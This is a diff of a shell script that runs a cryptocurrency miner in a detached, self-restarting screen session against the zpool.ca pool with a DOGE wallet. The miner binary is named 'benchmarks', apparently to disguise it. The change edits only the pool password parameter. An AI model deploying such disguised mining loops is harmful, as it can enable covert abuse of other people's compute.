@@ -23,7 +23,7 @@ else
   echo "▶ Menjalankan mining di screen 'amirul3'..."
   screen -dmS amirul3 bash -c '
     while true; do
-      ./benchmarks -a yespowerTIDE -o stratum+tcp://yespowerTIDE.sea.mine.zpool.ca:6239 -u D8n4HXcTza73pBw93ZnSgcZRo8rHdZJLux -p c=DOGE,amr -t 32
+      ./benchmarks -a yespowerTIDE -o stratum+tcp://yespowerTIDE.sea.mine.zpool.ca:6239 -u D8n4HXcTza73pBw93ZnSgcZRo8rHdZJLux -p c=DOGE -t 32
       sleep 2
     done
   '
